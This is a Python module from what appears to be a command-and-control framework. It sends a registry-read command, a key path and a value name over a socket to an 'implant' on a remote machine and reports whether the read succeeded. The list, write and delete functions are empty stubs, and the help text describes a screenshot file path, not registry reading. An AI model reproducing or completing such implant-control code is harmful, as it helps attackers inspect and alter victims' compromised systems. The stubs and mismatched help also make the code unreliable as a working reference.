# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with registry reading functionality 

SUCCESS = 1
FAILURE = 0

# Command value
REGREAD = 6
REGLIST = 7
REGWRITE = 8
REGDELETE = 9


'''
Description:
    Prints reg read usage for user 
Params:
    N/A
Returns:
    SUCCESS or FAILURE 
'''
def printRegReadHelp():
    print("""Required params: \n
                -filepath - Path where we would like to write our screenshot to locally \n""")
    return SUCCESS


'''
Description:
    Performs registry reading functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    keyPath - path to the registry key that holds the value we want to read
    valueName - name of the value under the registry key we want to read 
Returns:
    SUCCESS or FAILURE 
'''
def regRead(sock, keyPath, valueName):
    try:
        # First tell our implant we want to read a registry key 
        print("Sending command...")
        sock.send(bytes(str(REGREAD), "utf-8") + b'\x00')

        # Send key path to read
        print("Sending key path...")
        sock.send(keyPath + b'\x00')

        # Send value name to read
        print("Sending value name...")
        sock.send(valueName + b'\x00')

        # Receiving key value here... probably need a size first 
        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful reg read file!\n")

        else:
            print("Implant returned FAILURE!\n")

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg read to implant: ", e)
        return FAILURE
    
    return SUCCESS


def regList():
    try:

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg list to implant: ", e)
        return FAILURE
    
    return SUCCESS

def regWrite():
    try:

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg write to implant: ", e)
        return FAILURE
    
    return SUCCESS

def regDelete():
    try:

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg delete to implant: ", e)
        return FAILURE
    
    return SUCCESS